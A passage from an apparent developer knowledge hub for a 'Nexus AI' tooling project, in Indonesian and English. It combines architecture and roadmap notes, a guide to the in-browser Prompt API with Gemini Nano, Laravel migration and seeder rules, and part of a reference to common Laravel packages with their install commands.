- **Archiving**: Memindahkan file-file audit/planning yang sudah selesai ke dalam `NEXUS_SESSION_HISTORY_ARCHIVE.MD` untuk menjaga kapasitas disk.

---

## 🦾 4. Machinist: Mesin Evolusi Core (Upgraded)

`Machinist.js` memungkinkan Nexus AI untuk tumbuh secara dinamis dengan kecerdasan folder.

**Fungsi:**

- **Smart Auto-Integration**: Mendeteksi folder (`orchestrator`/`auditor`) secara otomatis dan melakukan injeksi kode yang aman ke dalam `NexusEngine.js` tanpa merusak struktur yang ada.

---

## 🛠️ 5. Logika Pendukung (The Muscles) (Upgraded)

Tiga komponen ini adalah "otot" yang menjalankan perintah teknis dengan presisi tinggi:

1.  **Modifier.js**: Kini mendukung **Multi-Option Resolution Automation**. Selain Batch Operations, ia mampu secara otomatis memecah blok Opsi A/B menjadi kode final berdasarkan input sistem.
2.  **Contract.js**: Dilengkapi dengan **Validation Guard**. Menjamin setiap data yang lewat memenuhi kontrak interface agar sistem tetap deterministik dan aman.
3.  **WorktreeManager.js**: Mendukung **Auto-Merge & Cleanup**. Mengelola isolasi fitur dari pembuatan hingga penggabungan kembali ke cabang utama secara otomatis.

---

## 🧐 Analisis & Rekomendasi Penyempurnaan

### Yang Sudah Sangat Kuat:

- **Separation of Concerns**: Pemisahan antara Auditor (External) dan Orchestrator (Internal) sudah sangat jelas.
- **Resilience**: Penggunaan `fs-extra` dan penanganan error yang baik di setiap modul.
- **Standardization**: Pola penamaan `NEXUS_` memberikan struktur yang sangat profesional.

### ✅ Yang Telah Berhasil Disempurnakan (Final State):

- **Parallel Specialist Audit**: `NexusEngine` menjalankan auditor secara paralel (Promise.all), meningkatkan kecepatan audit hingga 70%.
- **Multi-Option Collision Protocol**: Sistem Opsi A/B telah menggantikan logika IF-ELSE di seluruh engine, memberikan fleksibilitas keputusan yang maksimal.
- **Advanced Distillation Engine**: `Distiller.js` kini mampu melakukan ekstraksi bagian dokumen (Insights/Recommendations) dan penyematan *Contextual Anchors* secara cerdas.
- **Semantic Knowledge Indexing**: Sistem kini memiliki kemampuan **Semantic Search** berdasarkan tagging otomatis (Security, UI-UX, dll) untuk pemanggilan pengetahuan yang akurat.
- **Collision Resolution Automation**: `Modifier.js` telah mendukung resolusi otomatis blok Opsi A/B menjadi kode final.
- **Autonomous TDD Scaffolding (Phase 4)**: `NexusEngine` secara otomatis men-generate boilerplate test case (JS/PHP) saat mendeteksi pelanggaran TDD.
- **Semantic Cross-Linking (Phase 4)**: `Distiller.js` kini otomatis menautkan (link) kata kunci teknis antar dokumen di HUB, menciptakan jaring pengetahuan yang solid.
- **Self-Healing Documentation (Phase 4)**: Sistem secara otomatis mencatat log pemulihan mandiri ke dalam dokumen RECAP setiap kali terjadi resolusi benturan.

### 🚀 Roadmap Masa Depan (The Next Frontier):

#### ⚡ Phase 5: Predictive Analytics & High-Performance Core
1.  **Predictive Technical Debt Analyzer**: Spesialis auditor baru yang mampu memprediksi akumulasi hutang teknis berdasarkan frekuensi modifikasi file dan kompleksitas kode.
2.  **C++ Native Distillation Core**: Migrasi modul penyulingan (Distiller) ke C++ untuk pemrosesan dataset pengetahuan skala besar dengan kecepatan native.
3.  **Visual Audit Integration**: Kemampuan auditor untuk melakukan validasi visual terhadap UI/UX berdasarkan pedoman desain yang tersimpan di HUB.

#### 🛡️ Phase 6: Security & Intelligence Optimization
1.  **Nexus Redactor (Privacy Guard)**: Implementasi filter sensor data sensitif untuk mencegah kebocoran API Keys/Secrets ke dalam memori HUB.
2.  **Cognitive Feedback Loop**: Mekanisme belajar dari kegagalan verifikasi masa lalu (Anti-Patterns) untuk meningkatkan akurasi perencanaan.
3.  **Project Namespace Isolation**: Isolasi pengetahuan antar proyek untuk mencegah kontaminasi standar.
4.  **Hot Memory Indexing**: Prioritas konteks pada temuan audit terbaru untuk respon mesin yang lebih relevan.

*Detail rencana eksekusi: [NEXUS_PIPELINE_OPTIMIZATION_PLAN.md](../planning/NEXUS_PIPELINE_OPTIMIZATION_PLAN.md)*

---
*Generated by Nexus AI | Document Status: ARCHITECT_STRATEGY_LOCKED*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_LANGUAGE-MODEL.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

The Prompt API allows developers to run natural language processing tasks directly in the browser using **Gemini Nano**. This built-in AI approach ensures user privacy, reduces server costs, and enables offline functionality.

## 1. Getting Started and Hardware Requirements

The Prompt API is currently available in Chrome as of version 148 (Desktop) for Windows, macOS, Linux, and Chromebook Plus.

### Hardware Prerequisites

- **Storage**: 22 GB free space (for the initial profile and model).
- **Memory/CPU**: 16 GB RAM and 4+ CPU cores.
- **GPU**: 4 GB VRAM or more (Required for audio input).
- **Network**: Required only for the initial model download.

### Initializing the API

Check model availability before triggering a download:

```javascript
const availability = await LanguageModel.availability();

// Do not call create() when unavailable — the model cannot run on this device.
if (availability !== 'unavailable') {
	const session = await LanguageModel.create({
		monitor(m) {
			// Inform the user while the model downloads so the UI doesn't appear frozen.
			m.addEventListener('downloadprogress', (e) => {
				console.log(`Downloaded ${e.loaded * 100}%`);
			});
		},
	});
}
```

## 2. Core Prompting Capabilities

Session examples in this section omit `session.destroy()` for brevity. Always call `session.destroy()` when a session is no longer needed to free device memory (see Section 5).

### Basic and Streamed Output

For short responses, use `prompt()`. For longer content, use `promptStreaming()` to provide a more responsive UI.

**MANDATORY**: Never assign model output to `innerHTML`. Model output is untrusted and can contain injected markup. Always use `textContent` or a sanitizer.

```javascript
const session = await LanguageModel.create();

// prompt() accumulates the full response before resolving — use for short, one-shot output.
const result = await session.prompt('Write a haiku about coding.');
// textContent, not innerHTML — model output is untrusted and must not be parsed as markup.
outputEl.textContent = result;

// promptStreaming() yields independent chunks that must be concatenated;
// use for longer content so each chunk can be rendered progressively.
const stream = session.promptStreaming('Write a long story about a robot.');
let completeResult = '';
for await (const chunk of stream) {
	completeResult += chunk;
	outputEl.append(chunk);
}
console.log('Full story:', completeResult);
```

### Multimodal Input

The Prompt API supports text, audio, and visual inputs (images, canvas, video frames).

```javascript
const session = await LanguageModel.create({
	// Declaring expected input types lets the browser optimize model loading.
	expectedInputs: [{ type: 'text' }, { type: 'image' }],
	expectedOutputs: [{ type: 'text' }],
});

const response = await session.prompt([
	{
		role: 'user',
		content: [
			{ type: 'text', value: 'What is in this image?' },
			{ type: 'image', value: document.querySelector('canvas') },
		],
	},
]);
```

## 3. Advanced Session Management

Sessions allow the model to maintain context across multiple interactions.

### Context and Quota

Each session has a maximum token limit. You can monitor usage via `session.contextUsage` and `session.contextWindow`. If the window overflows, the oldest messages (except the system prompt) are dropped.

### Cloning Sessions

Cloning is efficient for starting parallel conversations that share the same initial context (like a "system" personality) without re-initializing.

```javascript
const mainSession = await LanguageModel.create({
	initialPrompts: [{ role: 'system', content: 'You speak like a pirate.' }],
});

const branchA = await mainSession.clone();
const branchB = await mainSession.clone();
// Destroy the base after cloning — the clones own their own context from here.
mainSession.destroy();
```

### Restoring Past Sessions

While a native "restore" feature is in development, you can recreate a session by feeding previous history into `initialPrompts`.

**Note**: `localStorage` is unencrypted and persistent. Stored conversation history may include user PII — consider the privacy implications before persisting chat history.

```javascript
// || '[]' ensures JSON.parse never receives null when the key doesn't exist yet.
const history = JSON.parse(localStorage.getItem('chat_history') || '[]');
const session = await LanguageModel.create({
	initialPrompts: history, // Array of {role, content} objects
});
```

## 4. Structured Output with JSON Schema

To prevent the model from adding "chatter" (e.g., "Sure, here is your JSON:"), use a **JSON Schema** via the `responseConstraint` field. This ensures the output is valid JSON that can be parsed immediately.

### Example: Sentiment Classification

```javascript
// Pass the schema as a plain object — do not JSON.stringify() it first.
const schema = {
	type: 'object',
	properties: {
		rating: { type: 'number', minimum: 1, maximum: 5 },
		is_positive: { type: 'boolean' },
	},
	required: ['rating', 'is_positive'],
};

const result = await session.prompt(
	"Rate the following feedback: 'The food was great!'",
	{ responseConstraint: schema },
);

const data = JSON.parse(result);
console.log(data.rating); // 5
```

### Constraints and Prefixes

You can guide the model further by prefilling the assistant's response using `prefix: true`.

````javascript
const character = await session.prompt([
	{ role: 'user', content: 'Create a character sheet' },
	{ role: 'assistant', content: '```json\n', prefix: true },
]);
````

## 5. Best Practices and Safety

- **Resource Cleanup**: Always call `session.destroy()` when a conversation is finished to free up memory.
- **Output Safety**: Model output is untrusted. Always write results to `textContent`, not `innerHTML`, to prevent XSS injection from malicious model output.
- Use a sanitizer like the native Sanitizer API or DOMPurify if you need to allow limited HTML.
- **Aborting Tasks**: Use `AbortController` to allow users to stop long-running generations. Pass the `signal` to `prompt()` or `promptStreaming()`, not to `LanguageModel.create()`.
- **Security**: Use Permission Policies to control access in iframes: `<iframe src="..." allow="language-model"></iframe>`.
- **Design**: Review the [People + AI Guidebook](https://pair.withgoogle.com/guidebook/) to ensure responsible AI implementation.

By combining structured outputs with robust session management, developers can build complex, stateful AI applications that run entirely on the user's device.

## 6. Fallback strategies

LanguageModel has limited availability.
Supported by: Chrome 148 (May 2026) and Edge 148 (May 2026).
Unsupported in: Firefox and Safari.

Before use, check if the LanguageModel object is available in the global scope:

```js
if ('LanguageModel' in self) {
  // The Prompt API is supported.
} else {
  // Execute fallback strategy
}
```

If the Prompt API is unsupported or availability checks return 'unavailable', you must gracefully fall back:

* Remote API Fallback: Redirect the detection request to a server endpoint or a cloud API (such as the Vertex AI Gemini API).
* Local API Fallback: Redirect the detection request to a local endpoint, for example, using Transformers.js. 


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, api]

### 📘 KNOWLEDGE: NEXUS_LARAVEL_DATABASE_RULES.MD

# 🗄️ Laravel Database Rules — Panduan Lengkap
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> Dokumen ini adalah aturan baku untuk semua operasi database di project Laravel.
> Dari buat tabel baru, seeder, sampai modifikasi kolom (tambah/hapus).
> **Berlaku untuk: Laravel 10+ / Laravel 12 (TALL Stack)**

---

## 📋 Daftar Isi

1. [Aturan Umum](#1-aturan-umum)
2. [Membuat Tabel Baru (Migration)](#2-membuat-tabel-baru-migration)
3. [Tipe Kolom yang Umum Dipakai](#3-tipe-kolom-yang-umum-dipakai)
4. [Seeder & Factory](#4-seeder--factory)
5. [Menambah Kolom Baru](#5-menambah-kolom-baru)
6. [Menghapus Kolom](#6-menghapus-kolom)
7. [Mengganti Nama Kolom](#7-mengganti-nama-kolom)
8. [Rollback & Fresh Migration](#8-rollback--fresh-migration)
9. [Contoh Kasus: Tabel Users — Tambah `phone`, Hapus `email`](#9-contoh-kasus-tabel-users--tambah-phone-hapus-email)
10. [Aturan Penamaan](#10-aturan-penamaan)

---

## 1. Aturan Umum

- **Jangan pernah edit file migration yang sudah di-commit.** Kalau mau ubah, buat migration baru.
- Setiap perubahan database = 1 file migration baru. Tidak boleh ada perubahan langsung via SQL manual di production.
- Selalu jalankan `php artisan migrate` — jangan pernah alter tabel langsung lewat phpMyAdmin/Adminer di production.
- Nama migration harus **deskriptif** — cerita apa yang dilakukan, bukan nama tabelnya saja.
- Selalu sertakan method `down()` yang kebalikan dari `up()` — wajib bisa di-rollback.
- Setiap tabel wajib punya `$table->timestamps()` kecuali ada alasan teknis yang kuat.

---

## 2. Membuat Tabel Baru (Migration)

### Perintah Artisan

```bash
php artisan make:migration create_nama_tabel_table
```

Contoh untuk tabel `products`:

```bash
php artisan make:migration create_products_table
```

### Struktur File Migration

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('products', function (Blueprint $table) {
            $table->id();                              // BIGINT UNSIGNED AUTO INCREMENT (Primary Key)
            $table->string('name');                    // VARCHAR 255
            $table->text('description')->nullable();   // TEXT, boleh kosong
            $table->unsignedBigInteger('price');       // angka positif
            $table->boolean('is_active')->default(true);
            $table->timestamps();                      // created_at & updated_at
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('products');
    }
};
```

### Jalankan Migration

```bash
php artisan migrate
```

---

## 3. Tipe Kolom yang Umum Dipakai

| Kebutuhan | Method |
|---|---|
| ID auto increment | `$table->id()` |
| UUID sebagai primary key | `$table->uuid('id')->primary()` |
| Teks pendek (max 255) | `$table->string('name')` |
| Teks pendek custom length | `$table->string('code', 10)` |
| Teks panjang | `$table->text('bio')` |
| Teks sangat panjang | `$table->longText('content')` |
| Angka bulat | `$table->integer('qty')` |
| Angka bulat besar | `$table->bigInteger('views')` |
| Angka positif saja | `$table->unsignedBigInteger('price')` |
| Desimal | `$table->decimal('rating', 3, 2)` — total 3 digit, 2 desimal |
| Boolean | `$table->boolean('is_active')->default(false)` |
| Tanggal saja | `$table->date('birth_date')` |
| Tanggal + waktu | `$table->dateTime('published_at')` |
| Timestamp (auto) | `$table->timestamps()` |
| Soft delete | `$table->softDeletes()` |
| Foreign key | `$table->foreignId('user_id')->constrained()` |
| Enum | `$table->enum('status', ['draft', 'published', 'archived'])` |
| JSON | `$table->json('metadata')->nullable()` |
| Nomor HP | `$table->string('phone', 20)->nullable()` |

> **Catatan nomor HP:** Selalu pakai `string`, bukan `integer`. Nomor HP bisa diawali `0` atau `+62`, angka tidak bisa menyimpan itu.

---

## 4. Seeder & Factory

### Membuat Seeder

```bash
php artisan make:seeder ProductSeeder
```

Isi `database/seeders/ProductSeeder.php`:

```php
<?php

namespace Database\Seeders;

use App\Models\Product;
use Illuminate\Database\Seeder;

class ProductSeeder extends Seeder
{
    public function run(): void
    {
        Product::create([
            'name'        => 'Produk Contoh',
            'description' => 'Deskripsi produk pertama',
            'price'       => 50000,
            'is_active'   => true,
        ]);
    }
}
```

Daftarkan di `DatabaseSeeder.php`:

```php
public function run(): void
{
    $this->call([
        ProductSeeder::class,
    ]);
}
```

Jalankan:

```bash
php artisan db:seed
# atau spesifik satu seeder:
php artisan db:seed --class=ProductSeeder
```

---

### Membuat Factory (untuk data dummy massal)

```bash
php artisan make:factory ProductFactory --model=Product
```

Isi `database/factories/ProductFactory.php`:

```php
<?php

namespace Database\Factories;

use Illuminate\Database\Eloquent\Factories\Factory;

class ProductFactory extends Factory
{
    public function definition(): array
    {
        return [
            'name'        => $this->faker->words(3, true),
            'description' => $this->faker->paragraph(),
            'price'       => $this->faker->numberBetween(10000, 500000),
            'is_active'   => $this->faker->boolean(80), // 80% kemungkinan true
        ];
    }
}
```

Pakai di Seeder:

```php
// Generate 50 data dummy
Product::factory()->count(50)->create();
```

---

## 5. Menambah Kolom Baru

### ⚠️ Aturan Penting

> **Jangan edit file migration lama yang sudah di-migrate.**
> Selalu buat file migration baru dengan prefix `add_` atau `add_kolom_to_`.

### Perintah

```bash
php artisan make:migration add_phone_to_users_table
```

### Struktur File

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            // Tambah kolom phone setelah kolom 'name'
            $table->string('phone', 20)->nullable()->after('name');
        });
    }

    public function down(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('phone');
        });
    }
};
```

> **`->after('nama_kolom')`** — opsional tapi bagus untuk menjaga urutan kolom rapi.
> **`->nullable()`** — wajib kalau data lama belum punya value untuk kolom ini. Kalau tidak nullable, migration akan gagal karena row lama tidak punya value.

### Jalankan

```bash
php artisan migrate
```

---

## 6. Menghapus Kolom

### Perintah

```bash
php artisan make:migration remove_email_from_users_table
```

### Struktur File

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('email');
        });
    }

    public function down(): void
    {
        // Kembalikan kolom kalau di-rollback
        Schema::table('users', function (Blueprint $table) {
            $table->string('email')->unique()->after('name');
        });
    }
};
```

### Hapus Beberapa Kolom Sekaligus

```php
$table->dropColumn(['email', 'email_verified_at']);
```

> **Catatan:** Kalau ada index atau unique constraint di kolom tersebut, harus drop index-nya dulu sebelum drop kolom.

```php
// Drop unique index dulu, baru drop kolom
$table->dropUnique(['email']);
$table->dropColumn('email');
```

---

## 7. Mengganti Nama Kolom

```bash
php artisan make:migration rename_phone_number_to_phone_in_users_table
```

```php
public function up(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->renameColumn('phone_number', 'phone');
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->renameColumn('phone', 'phone_number');
    });
}
```

---

## 8. Rollback & Fresh Migration

| Perintah | Fungsi |
|---|---|
| `php artisan migrate` | Jalankan migration yang belum dijalankan |
| `php artisan migrate:rollback` | Undo batch migration terakhir |
| `php artisan migrate:rollback --step=3` | Undo 3 batch terakhir |
| `php artisan migrate:reset` | Rollback semua migration |
| `php artisan migrate:fresh` | Drop semua tabel, migrate ulang dari awal |
| `php artisan migrate:fresh --seed` | Fresh + jalankan semua seeder |
| `php artisan migrate:status` | Lihat status tiap migration |

> **⚠️ `migrate:fresh` akan menghapus semua data.** Hanya boleh dipakai di local/development. **Dilarang keras di production.**

---

## 9. Contoh Kasus: Tabel Users — Tambah `phone`, Hapus `email`

Ini skenario nyata: kamu punya tabel `users` default Laravel yang punya kolom `email`, dan sekarang mau:
- ✅ Tambah kolom `phone`
- ❌ Hapus kolom `email` dan `email_verified_at`

### Langkah 1 — Buat migration untuk tambah `phone`

```bash
php artisan make:migration add_phone_to_users_table
```

```php
public function up(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->string('phone', 20)->nullable()->unique()->after('name');
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->dropColumn('phone');
    });
}
```

### Langkah 2 — Buat migration untuk hapus `email`

```bash
php artisan make:migration remove_email_from_users_table
```

```php
public function up(): void
{
    Schema::table('users', function (Blueprint $table) {
        // Drop unique index email dulu sebelum drop kolom
        $table->dropUnique(['email']);
        $table->dropColumn(['email', 'email_verified_at']);
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->string('email')->unique()->after('name');
        $table->timestamp('email_verified_at')->nullable()->after('email');
    });
}
```

### Langkah 3 — Update Model `User.php`

Setelah migration, update `$fillable` di Model:

```php
protected $fillable = [
    'name',
    'phone',     // ✅ tambah
    'password',
    // 'email',  // ❌ hapus
];
```

Kalau pakai `$hidden`:

```php
protected $hidden = [
    'password',
    'remember_token',
    // 'email', // ❌ hapus dari hidden juga kalau ada
];
```

### Langkah 4 — Update Seeder (kalau ada)

```php
User::create([
    'name'     => 'Admin',
    'phone'    => '08123456789',   // ✅ pakai phone
    'password' => bcrypt('secret'),
    // 'email' => tidak perlu lagi
]);
```

### Langkah 5 — Jalankan

```bash
php artisan migrate
```

---

## 10. Aturan Penamaan

| Yang dibuat | Format | Contoh |
|---|---|---|
| File migration buat tabel | `create_{nama_tabel}_table` | `create_products_table` |
| File migration tambah kolom | `add_{kolom}_to_{tabel}_table` | `add_phone_to_users_table` |
| File migration hapus kolom | `remove_{kolom}_from_{tabel}_table` | `remove_email_from_users_table` |
| File migration ubah kolom | `change_{kolom}_in_{tabel}_table` | `change_price_in_products_table` |
| File migration rename kolom | `rename_{lama}_to_{baru}_in_{tabel}_table` | `rename_phone_number_to_phone_in_users_table` |
| Nama tabel di database | `snake_case`, plural | `user_profiles`, `order_items` |
| Nama kolom | `snake_case` | `created_at`, `phone_number` |
| Nama Model | `PascalCase`, singular | `UserProfile`, `OrderItem` |
| Nama Seeder | `{Model}Seeder` | `UserSeeder`, `ProductSeeder` |
| Nama Factory | `{Model}Factory` | `UserFactory`, `ProductFactory` |

---

> 📌 **Ingat selalu:** Database migration adalah *sejarah* perubahan skema. Jangan hapus, jangan edit yang lama — cukup tambah yang baru.

---

*Dokumen ini bagian dari NEXUS Rules — TALL Stack Standards*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, vcs]

### 📘 KNOWLEDGE: NEXUS_LARAVEL_DEPENDENCIES_GUIDE.MD

# 📦 Laravel Dependencies & Packages — Panduan Lengkap
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> Referensi semua package Laravel yang umum dipakai — dari UI framework, auth,
> role & permission, media, sampai utility. Lengkap dengan kegunaan, install command,
> dan kapan harus pakai / tidak pakai.
>
> **Berlaku untuk: Laravel 10+ / Laravel 12 (TALL Stack)**

---

## 📋 Daftar Isi

1. [UI & Component Framework](#1-ui--component-framework)
2. [Authentication & Authorization](#2-authentication--authorization)
3. [Admin Panel](#3-admin-panel)
4. [Role & Permission](#4-role--permission)
5. [Media & File Management](#5-media--file-management)
6. [Activity Log & Audit Trail](#6-activity-log--audit-trail)
7. [Settings & Configuration](#7-settings--configuration)
8. [SEO & Metadata](#8-seo--metadata)
9. [Image Processing](#9-image-processing)
10. [PDF & Export](#10-pdf--export)
11. [Notification & Email](#11-notification--email)
12. [API & Utility](#12-api--utility)
13. [Testing](#13-testing)
14. [Development Tools](#14-development-tools)
15. [Tabel Perbandingan Cepat](#15-tabel-perbandingan-cepat)
16. [Stack Rekomendasi per Jenis Project](#16-stack-rekomendasi-per-jenis-project)

---

## 1. UI & Component Framework

---

### 🔵 Livewire

| Detail | Info |
|---|---|
| **Package** | `livewire/livewire` |
| **Versi Stabil** | v3.x |
| **Dibuat oleh** | Caleb Porzio |

**Kegunaan:**
Framework full-stack untuk membangun UI interaktif di Laravel tanpa menulis JavaScript. Komponen PHP yang bereaksi seperti JavaScript — form realtime, live search, counter, wizard step, modal, dan sebagainya.

**Install:**
```bash
composer require livewire/livewire
```

**Buat komponen:**
```bash
php artisan make:livewire NamaKomponen
```

**Kapan pakai:**
- App internal, dashboard, CRUD yang butuh interaktivitas tanpa SPA penuh
- Tim yang kuat PHP tapi tidak terlalu dalam JS
- Cocok dikombinasi dengan Alpine.js untuk UI ringan

**Kapan TIDAK pakai:**
- Butuh realtime ekstrem (chat live, collaborative editing) — pertimbangkan WebSocket
- App yang sangat berat di sisi client

---

### 🟡 Alpine.js

| Detail | Info |
|---|---|
| **Package** | CDN / via npm: `alpinejs` |
| **Versi Stabil** | v3.x |
| **Dibuat oleh** | Caleb Porzio |

**Kegunaan:**
JavaScript minimal (disebut "Tailwind-nya JavaScript") untuk interaksi UI ringan: toggle, dropdown, modal, tab, accordion — langsung di HTML attribute. Tidak butuh build step kalau pakai CDN.

**Install via npm:**
```bash
npm install alpinejs
```

**Via CDN (taruh di layout blade):**
```html
<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
```

**Kapan pakai:**
- Semua project TALL Stack — Alpine adalah bagian dari stack
- Interaksi sederhana yang tidak perlu full Vue/React

---

### 🔵 Inertia.js

| Detail | Info |
|---|---|
| **Package** | `inertiajs/inertia-laravel` |
| **Frontend** | React / Vue / Svelte |

**Kegunaan:**
Jembatan antara Laravel backend dan React/Vue frontend — tanpa REST API terpisah. Routing tetap di Laravel, tapi view di-render oleh React/Vue. Disebut "the modern monolith".

**Install:**
```bash
composer require inertiajs/inertia-laravel
npm install @inertiajs/react  # atau @inertiajs/vue3
```

**Kapan pakai:**
- Tim yang sudah familiar React/Vue tapi tidak mau buat API terpisah
- App yang butuh UX SPA penuh tapi tetap pakai Laravel routing

**Kapan TIDAK pakai:**
- Project yang sudah pakai Livewire — pilih salah satu, jangan campur tanpa alasan kuat

---

### 🟠 Tailwind CSS

| Detail | Info |
|---|---|
| **Package** | `npm install tailwindcss` |
| **Versi Stabil** | v4.x |

**Kegunaan:**
Utility-first CSS framework. Tidak ada class `.btn-primary` yang pre-defined — semua dibangun dari utility class seperti `flex`, `p-4`, `text-lg`, `bg-blue-500`.

**Install:**
```bash
npm install tailwindcss @tailwindcss/vite
```

**Kapan pakai:**
- Semua project TALL Stack — Tailwind adalah bagian dari stack
- Custom design yang tidak mau terikat Bootstrap/Bulma

---

---

## 2. Authentication & Authorization

---

### 🟢 Laravel Breeze

| Detail | Info |
|---|---|
| **Package** | `laravel/breeze` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Starter kit auth yang **minimal dan ringan** — login, register, forgot password, email verification. Stack pilihan: Blade, Livewire, React (Inertia), Vue (Inertia), atau API-only.

**Install:**
```bash
composer require laravel/breeze --dev
php artisan breeze:install

# Pilih stack:
# blade | livewire | react | vue | api
php artisan breeze:install livewire

php artisan migrate
npm install && npm run dev
```

**Kapan pakai:**
- Project baru yang butuh auth sederhana dan bisa dikustomisasi bebas
- Titik awal yang bersih, tidak banyak bloat

---

### 🔴 Laravel Jetstream

| Detail | Info |
|---|---|
| **Package** | `laravel/jetstream` |
| **Dibuat oleh** | Laravel Official |
| **Stack** | Livewire atau Inertia (Vue) |

**Kegunaan:**
Starter kit auth yang **lengkap dan fitur-rich** — login, register, 2FA, session management, profile photo, API token (Sanctum), dan **team management** (opsional).

**Install:**
```bash
composer require laravel/jetstream
php artisan jetstream:install livewire   # atau: inertia

# Dengan fitur teams:
php artisan jetstream:install livewire --teams

php artisan migrate
npm install && npm run dev
```

**Fitur bawaan Jetstream:**
- ✅ Login / Register / Forgot Password
- ✅ Email Verification
- ✅ Two-Factor Authentication (2FA)
- ✅ Session Management (lihat semua device aktif)
- ✅ Profile Management + Upload Foto
- ✅ API Token via Laravel Sanctum
- ✅ Team Management (opsional)

**Kapan pakai:**
- SaaS app, project yang butuh 2FA, multi-user dengan teams
- Tidak mau setup auth dari awal

**Kapan TIDAK pakai:**
- App sederhana — terlalu berat, banyak file yang tidak dipakai
- Lebih baik pakai Breeze kalau tidak butuh semua fitur ini

---

### 🟣 Laravel Sanctum

| Detail | Info |
|---|---|
| **Package** | `laravel/sanctum` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Autentikasi ringan untuk SPA (Single Page Application) dan API. Bisa issue API token sederhana tanpa OAuth penuh. Jetstream sudah include Sanctum.

**Install:**
```bash
composer require laravel/sanctum
php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
php artisan migrate
```

**Kapan pakai:**
- REST API yang dikonsumsi mobile app atau frontend SPA
- Token-based auth yang sederhana

---

### 🔵 Laravel Passport

| Detail | Info |
|---|---|
| **Package** | `laravel/passport` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
OAuth 2.0 server penuh untuk Laravel. Bisa buat authorization server sendiri dengan grant types: Authorization Code, Client Credentials, Password Grant, Implicit, Refresh Token.

**Install:**
```bash
composer require laravel/passport
php artisan passport:install
```

**Kapan pakai:**
- Platform yang butuh OAuth 2.0 standar — misalnya third-party app perlu akses API user-mu
- Enterprise, marketplace, ekosistem yang punya banyak client

**Kapan TIDAK pakai:**
- App internal biasa — terlalu overkill, pakai Sanctum saja

---

---

## 3. Admin Panel

---

### 🟠 Filament

| Detail | Info |
|---|---|
| **Package** | `filament/filament` |
| **Versi Stabil** | v3.x |
| **Dibuat oleh** | Dan Harrin & Community |

**Kegunaan:**
Admin panel lengkap berbasis TALL Stack (Tailwind + Alpine + Livewire) — bisa generate CRUD resource, form builder, table builder, widget dashboard, dan banyak plugin ekosistem. Salah satu admin panel terpopuler di Laravel.

**Install (panel admin):**
```bash
composer require filament/filament:"^3.2" -W
php artisan filament:install --panels
php artisan make:filament-user
```

**Buat Resource (CRUD otomatis):**
```bash
php artisan make:filament-resource Product --generate
```

**Komponen utama Filament:**
| Komponen | Kegunaan |
|---|---|
| **Resource** | CRUD otomatis untuk 1 model |
| **Page** | Halaman custom (dashboard, settings) |
| **Widget** | Widget statistik di dashboard |
| **Form Builder** | Form component (TextInput, Select, FileUpload, dll) |
| **Table Builder** | Tabel dengan filter, sort, bulk action |
| **Action** | Tombol + modal (confirm, form, redirect) |
| **Notification** | Toast notification |
| **Infolist** | Detail view read-only |

**Plugin populer Filament:**
```bash
# Shield — Role & Permission terintegrasi Filament
composer require bezhansalleh/filament-shield

# Excel Export
composer require pxlrbt/filament-excel

# Activity Log
composer require z3d0x/filament-logger
```

**Kapan pakai:**
- Admin panel untuk client / internal tim
- Butuh CRUD cepat tanpa banyak custom code
- Dashboard dengan statistik dan widget

---

### 🟡 Nova (Laravel Official)

| Detail | Info |
|---|---|
| **Package** | `laravel/nova` |
| **Harga** | **Berbayar** ($199/project atau $299 unlimited) |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Admin panel resmi dari Laravel team. Lebih "official" dari Filament, desain lebih premium, tapi berbayar.

**Kapan pakai:**
- Budget ada, mau admin panel dengan support resmi Laravel
- Tim yang lebih nyaman dengan ekosistem official

**Kapan TIDAK pakai:**
- Budget terbatas — Filament gratis dan fiturnya tidak kalah jauh

---

---

## 4. Role & Permission

---

### 🟣 Spatie Laravel Permission

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-permission` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Role & permission management untuk Laravel. Bisa assign role ke user, bisa assign permission ke role atau langsung ke user. Terintegrasi dengan gate/policy Laravel.

**Install:**
```bash
composer require spatie/laravel-permission
php artisan vendor:publish --provider="Spatie\Permission\PermissionServiceProvider"
php artisan migrate
```

**Setup Model User:**
```php
use Spatie\Permission\Traits\HasRoles;

class User extends Authenticatable
{
    use HasRoles;
}
```

**Penggunaan dasar:**
```php
// Buat role & permission
Role::create(['name' => 'admin']);
Permission::create(['name' => 'edit posts']);

// Assign ke user
$user->assignRole('admin');
$user->givePermissionTo('edit posts');

// Cek di blade
@role('admin') ... @endrole
@can('edit posts') ... @endcan

// Cek di controller
$user->hasRole('admin');
$user->can('edit posts');
```

**Kapan pakai:**
- Hampir semua project yang punya lebih dari 1 tipe user
